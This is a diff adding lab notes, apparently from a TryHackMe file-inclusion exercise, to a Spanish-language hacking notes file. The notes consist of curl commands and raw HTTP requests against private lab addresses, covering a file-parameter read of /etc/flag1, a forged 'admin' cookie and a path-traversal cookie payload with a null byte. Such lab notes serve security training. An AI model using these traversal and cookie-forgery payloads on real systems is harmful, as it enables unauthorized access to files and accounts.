@@ -9,6 +9,48 @@ https://github.com/The-Art-of-Hacking/h4cker
 
 
 ---
+curl -X POST http://10.10.188.47/challenges/chall1.php -d "method=GET&file=/etc/flag1"
+
+└─$ curl -I http://10.10.250.214/challenges/chall2.php                                  
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Tue, 27 May 2025 17:22:58 GMT
+Content-Type: text/html
+Connection: keep-alive
+Set-Cookie: THM=Guest; expires=Tue, 27-May-2025 18:12:58 GMT; path=/
+Vary: Accept-Encoding
+
+curl -b THM=admin http://10.10.188.47/challenges/chall1.php
+Use Burpsuite
+GET /challenges/chall2.php HTTP/1.1
+Host: 10.10.250.214
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://10.10.250.214/challenges/index.php
+Connection: keep-alive
+Cookie: THM=admin
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+Current Path
+/var/www/html
+File Content Preview of admin
+Welcome admin
+This is a admin web page! Get the flag! 
+
+GET /challenges/chall2.php HTTP/1.1
+Host: 10.10.250.214
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://10.10.250.214/challenges/index.php
+Connection: keep-alive
+Cookie: THM=../../../etc/flag2%00
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
 
 # Inclusión de Archivos (File Inclusion)
 
